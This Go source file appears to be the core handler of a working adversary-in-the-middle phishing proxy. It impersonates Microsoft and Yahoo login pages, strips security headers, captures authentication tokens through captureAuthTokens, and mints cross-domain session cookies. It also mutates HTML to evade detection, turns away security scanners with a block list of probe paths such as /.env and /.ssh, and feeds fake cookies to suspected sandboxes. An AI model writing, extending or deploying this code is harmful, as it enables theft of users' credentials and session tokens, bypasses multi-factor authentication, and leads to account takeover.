package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

const faviconSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="0.9em" font-size="90">🔒</text></svg>`

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		randByte := make([]byte, 1)
		rand.Read(randByte)
		b[i] = letters[int(randByte[0])%len(letters)]
	}
	return string(b)
}

func mutateHTML(body []byte) []byte {
	body = bytes.ReplaceAll(body, []byte(`document.domain="yahoo.com"`), []byte(`document.domain="`+phishDomain+`"`))
	body = bytes.ReplaceAll(body, []byte(`document.domain = "yahoo.com"`), []byte(`document.domain = "`+phishDomain+`"`))
	body = bytes.ReplaceAll(body, []byte(`document.domain='yahoo.com'`), []byte(`document.domain='`+phishDomain+`'`))

	body = bytes.ReplaceAll(body, []byte(`<meta name="generator"`), []byte(`<!-- m -->`))
	body = bytes.ReplaceAll(body, []byte(`content="Zoho"`), []byte(`content="App"`))
	body = bytes.ReplaceAll(body, []byte(`content="Microsoft"`), []byte(`content="App"`))

	noiseClass := randomString(12)
	noiseText := randomString(32)
	commentNoise := randomString(16)

	headInjection := []byte(fmt.Sprintf(`<style>.%s{display:none!important;}</style><!-- %s -->`, noiseClass, commentNoise))
	body = bytes.Replace(body, []byte("<head>"), append([]byte("<head>"), headInjection...), 1)

	bodyInjection := []byte(fmt.Sprintf(`<!-- %s --><div class="%s" style="display:none;position:absolute;z-index:-1;">%s</div>`, randomString(16), noiseClass, noiseText))
	body = bytes.Replace(body, []byte("</body>"), append(bodyInjection, []byte("</body>")...), 1)

	return body
}

var botPaths = []string{
	"/wp-admin", "/wp-login", "/wp-content", "/wp-includes", "/wp-json",
	"/wp-config", "/wp-cron", "/xmlrpc.php", "/.env", "/.git", "/.svn", "/.hg",
	"/.aws", "/.docker", "/.kube", "/.config", "/.ssh", "/.npmrc", "/.htaccess",
	"/.htpasswd", "/.ds_store", "/admin", "/administrator", "/phpmyadmin", "/pma",
	"/myadmin", "/manager", "/host-manager", "/actuator", "/console", "/debug",
	"/trace", "/heapdump", "/_debug", "/_profiler", "/telescope", "/shell", "/cmd",
	"/command", "/c99", "/r57", "/cgi-bin", "/fcgi-bin", "/backup", "/backups",
	"/dump", "/database.sql", "/db.sql", "/autodiscover", "/ecp", "/owa", "/exchange",
	"/mapi", "/vendor", "/node_modules", "/composer.json", "/solr", "/jenkins",
	"/hudson", "/struts", "/graphql", "/install", "/setup", "/config.php", "/configuration.php",
}

func isBotPath(path string) bool {
	for _, p := range botPaths {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

func handleNoise(w http.ResponseWriter, r *http.Request) bool {
	path := strings.ToLower(r.URL.Path)
	if path == "/favicon.ico" {
		w.Header().Set("Content-Type", "image/svg+xml")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(faviconSVG))
		return true
	}
	if isBotPath(path) {
		http.NotFound(w, r)
		return true
	}
	return false
}

type ctxKey string

const (
	ctxKeyBaseDomain ctxKey = "prism.baseDomain"
	ctxKeyRole       ctxKey = "prism.role"
)

func withDomainContext(r *http.Request, role, baseDomain string) *http.Request {
	ctx := context.WithValue(r.Context(), ctxKeyBaseDomain, baseDomain)
	ctx = context.WithValue(ctx, ctxKeyRole, role)
	return r.WithContext(ctx)
}

func baseDomainOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyBaseDomain).(string); ok && v != "" {
		return v
	}
	return phishDomain
}

func roleOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyRole).(string); ok {
		return v
	}
	return ""
}

func redirectToLanding(w http.ResponseWriter, r *http.Request, baseDomain, reason string) {
	dest := "https://" + landingHostFor(baseDomain) + r.URL.RequestURI()
	log.Printf("[→] [%s] %s → %s (302)", r.Host, reason, dest)
	http.Redirect(w, r, dest, http.StatusFound)
}

func handleCORSOptions(w http.ResponseWriter, r *http.Request) {
	origin := r.Header.Get("Origin")
	if origin == "" {
		origin = "*"
	}
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")

	reqHeaders := r.Header.Get("Access-Control-Request-Headers")
	if reqHeaders != "" {
		w.Header().Set("Access-Control-Allow-Headers", reqHeaders)
	} else {
		w.Header().Set("Access-Control-Allow-Headers", "Origin, Content-Type, Accept, Authorization, X-Requested-With")
	}
	w.Header().Set("Access-Control-Max-Age", "86400")
	w.WriteHeader(204)
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	role, baseDomain, isRole := resolveHost(r.Host)
	r = withDomainContext(r, role, baseDomain)
	host := strings.ToLower(stripPort(r.Host))

	configMu.RLock()
	domainState := activeConfig.Domains[baseDomain]
	configMu.RUnlock()

	if domainState != nil && !domainState.Enabled {
		log.Printf("[⛔] BLOCKED: Domain '%s' is globally disabled", baseDomain)
		blockResponse(w)
		return
	}

	if blocked, reason := isBlocked(r); blocked {
		log.Printf("[x] BLOCKED: %s — %s", extractIP(r), reason)
		blockResponse(w)
		ip := extractIP(r)
		prefix := extractIPPrefix(ip)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), IP: ip, IPPrefix: prefix,
			Fingerprint: r.Header.Get("X-CF-Fingerprint"),
			UserAgent:   r.UserAgent(), Route: "filter", Action: "blocked",
		})
		return
	}

	if !isRole {
		if handleNoise(w, r) {
			return
		}
		redirectToLanding(w, r, baseDomain, "unknown host")
		return
	}

	// ── 3. Landing role (go.<baseDomain>): the dynamic gate page. ──
	if role == landingRole {
		switch r.URL.Path {
		case detectEndpoint:
			handleDetect(w, r)
			return
		case profileEndpoint:
			profileHandler(w, r)
			return
		case captureEndpoint:
			captureHandler(w, r)
			return
		}

		if r.Method == "OPTIONS" {
			handleCORSOptions(w, r)
			return
		}

		// ══════════════════════════════════════════════════════════
		// CRITICAL: Mint the session cookie BEFORE any redirect or template serve.
		// This ensures the browser has the "gate pass" for the target subdomain.
		// ══════════════════════════════════════════════════════════
		session := sessionMgr.GetOrCreate(r, baseDomain)
		session.SetLandingPageServedAt()
		w.Header().Set("Set-Cookie", fmt.Sprintf(
			"%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
			sessionMgr.cookieName, session.ID, baseDomain))

		configMu.RLock()
		state := activeConfig.Domains[baseDomain]
		configMu.RUnlock()

		templateName := "portal"
		if state != nil && state.LandingTemplate != "" {
			templateName = state.LandingTemplate
		}

		// MODE A: Handle "none" without deriving routing from recipient email/domain.
		// The NSL Mailer ?data= payload is decoded only as opaque campaign metadata.
		if templateName == "none" {
			targetName := "microsoft" // Default fallback
			if state != nil && state.DefaultTarget != "" {
				targetName = state.DefaultTarget
			}

			if payload, ok := prismLinkDataFromRequest(r); ok && payload.CID != "" {
				session.SetCampaignID(payload.CID)
			}

			dest := fmt.Sprintf("https://%s.%s/", targetName, baseDomain)
			log.Printf("[→] [%s] DIRECT ROUTE: redirecting to configured target %s", baseDomain, targetName)
			http.Redirect(w, r, dest, http.StatusFound)
			return
		}

		// MODE B: Serve the React App from ./templates/<templateName>
		templatePath := "./templates/" + templateName
		if _, err := os.Stat(templatePath); os.IsNotExist(err) {
			log.Printf("[!] WARNING: Template folder '%s' not found.", templatePath)
			w.Header().Set("Content-Type", "text/html")
			w.WriteHeader(http.StatusServiceUnavailable)
			w.Write([]byte("<h1>Portal configuration error. Contact administrator.</h1>"))
			return
		}

		fs := http.FileServer(http.Dir(templatePath))
		http.StripPrefix("/", fs).ServeHTTP(w, r)
		return
	}

	// ── 4. Provider role → resolve the target by role. ──
	target := lookupTargetByRole(role)
	targetKey := strings.ToLower(strings.Split(target.Name, " ")[0])
	if !IsTargetEnabled(baseDomain, targetKey) {
		log.Printf("[⛔] BLOCKED: Target '%s' is disabled for domain %s", targetKey, baseDomain)
		http.NotFound(w, r)
		return
	}

	// ── 5. GATE: only the ENTRY subdomain requires the session cookie ──
	if host == target.EntrySubdomainFor(baseDomain) {
		if _, err := r.Cookie(sessionMgr.cookieName); err != nil {
			redirectToLanding(w, r, baseDomain, "no gate cookie")
			return
		}
	}

	// ── 6. API endpoints on provider subdomains ──
	switch r.URL.Path {
	case detectEndpoint:
		handleDetect(w, r)
		return
	case profileEndpoint:
		profileHandler(w, r)
		return
	case captureEndpoint:
		captureHandler(w, r)
		return
	}

	// ── 7. CORS preflight ──
	if r.Method == "OPTIONS" {
		handleCORSOptions(w, r)
		return
	}

	// ── 8. Session tracking ──
	session := sessionMgr.GetOrCreate(r, baseDomain)
	if session != nil && session.TargetName == "" {
		session.TargetName = target.Name
	}
	if session != nil {
		session.SetCampaignID(campaignIDFromRequest(r))
	}

	// ── 9. Behavioral telemetry (Fixed-Size Sliding Window) ──
	if session != nil {
		nowMS := time.Now().UnixMilli()
		session.mu.Lock()
		session.ActivityWindow.Add(nowMS, uint64(len(r.URL.Path)), false)
		reqs, errs, _ := session.ActivityWindow.GetWindowStats(nowMS)

		if reqs > 50 || errs > 20 {
			session.IsHoneypot = true
			log.Printf("[🍯] HONEYPOT ACTIVATED: Session %s flagged as bot/sandbox (%d reqs, %d errs)", session.ID[:8], reqs, errs)
		}
		session.mu.Unlock()
	}

	// ── 10. Fire correlation event for ALLOWED traffic ──
	if session != nil {
		ip := extractIP(r)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), SessionID: session.ID, IP: ip, IPPrefix: extractIPPrefix(ip),
			Fingerprint: r.Header.Get("X-CF-Fingerprint"), UserAgent: r.UserAgent(),
			Route: role, Action: "allowed",
		})
	}

	// ── 11. Post-login handoff (The Frame-Breaker) ──
	if session != nil && session.ReachedService && target.ServiceUpstream != "" &&
		host == target.EntrySubdomainFor(baseDomain) && (r.URL.Path == "/" || r.URL.Path == "") {
		if svc := target.ReverseMapFor(baseDomain)[target.ServiceUpstream]; svc != "" {
			realURL := "https://" + svc + "/"
			log.Printf("[→] [%d] [%s] post-login handoff (Frame-Breaker) → %s", session.Index, target.Name, realURL)

			frameBreakerHTML := fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>Loading...</title></head>
<body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#fff;font-family:sans-serif;">
	<div style="text-align:center;">
		<div style="border:4px solid #334155;border-top:4px solid #3b82f6;border-radius:50%%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
		<p>Verifying session and loading workspace...</p>
	</div>
	<style>@keyframes spin {0%% {transform:rotate(0deg);} 100%% {transform:rotate(360deg);}}</style>
	<script>
		setTimeout(function() {
			if (window.top && window.top !== window.self) {
				window.top.location.replace("%s");
			} else {
				window.location.replace("%s");
			}
		}, 1500);
	</script>
</body></html>`, realURL, realURL)

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(frameBreakerHTML))
			return
		}
	}

	// ── 12. Termination redirect ──
	if shouldTerminate(session, r) {
		doTerminate(w, session, r)
		return
	}

	// ── 13. Route to upstream ──
	upstream, ok := target.HostMapFor(baseDomain)[host]
	if !ok {
		upstream = "login.microsoftonline.com"
	}
	targetURL := &url.URL{Scheme: "https", Host: upstream}
	proxy := httputil.NewSingleHostReverseProxy(targetURL)
	proxy.Transport = browserHTTPTransport

	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		*req = *req.WithContext(r.Context())
		rewriteRequest(req, host, upstream, target, session)
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Strict-Transport-Security")

		captureAuthTokens(resp, session, target)
		err := rewriteResponse(resp, r, session, target)

		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
		mime = strings.TrimSpace(strings.ToLower(mime))

		if mime == "text/html" {
			bodyBytes, readErr := io.ReadAll(resp.Body)
			if readErr == nil {
				resp.Body.Close()
				mutatedBody := mutateHTML(bodyBytes)
				resp.Body = io.NopCloser(bytes.NewReader(mutatedBody))
				resp.ContentLength = int64(len(mutatedBody))
				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(mutatedBody)))
			}
		}

		if mime == "text/html" || strings.Contains(mime, "x-component") || mime == "application/json" {
			cookie := fmt.Sprintf("%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
				sessionMgr.cookieName, session.ID, baseDomain)
			resp.Header.Add("Set-Cookie", cookie)

			if session != nil && session.IsHoneypot {
				fakeToken := fmt.Sprintf("FAKE_AUTH_TOKEN=%s; Path=/; Domain=.%s; Max-Age=86400; HttpOnly; Secure",
					randomString(32), baseDomain)
				resp.Header.Add("Set-Cookie", fakeToken)
				log.Printf("[🍯] HONEYPOT: Injected fake auth cookies for session %s", session.ID[:8])
			}
		}
		return err
	}

	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[!] Proxy error: %v", err)
		w.WriteHeader(http.StatusBadGateway)
		w.Write([]byte("Bad Gateway"))
	}

	log.Printf("[>] [%d] [%s] %s %s%s → %s", session.Index, target.Name, r.Method, r.Host, r.URL.Path, upstream)
	proxy.ServeHTTP(w, r)
}

func extractBaseDomain(host string) string {
	parts := splitHost(host)
	if len(parts) >= 2 {
		return parts[len(parts)-2] + "." + parts[len(parts)-1]
	}
	return host
}

func splitHost(host string) []string {
	var parts []string
	current := ""
	for _, c := range host {
		if c == '.' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		parts = append(parts, current)
	}
	return parts
}

func extractIPPrefix(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) == 4 {
		return strings.Join(parts[:3], ".")
	}
	return ip
}
